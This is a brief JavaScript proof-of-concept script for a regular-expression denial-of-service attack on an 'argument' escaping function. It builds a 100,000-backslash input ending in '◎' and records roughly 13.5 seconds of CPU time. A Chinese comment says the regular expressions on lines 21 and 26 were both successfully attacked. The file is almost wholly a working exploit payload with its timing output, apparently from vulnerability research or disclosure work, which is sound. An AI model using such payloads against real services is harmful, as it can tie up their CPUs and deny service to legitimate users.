const { argument } = require("./escape.js");

//Attack String :""+"\\"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "\\";
}
str += "◎";

console.log(argument(str));


// real    0m13.552s
// user    0m13.519s
// sys     0m0.010s

//第21行、第26行的两个正则表达式均攻击成功
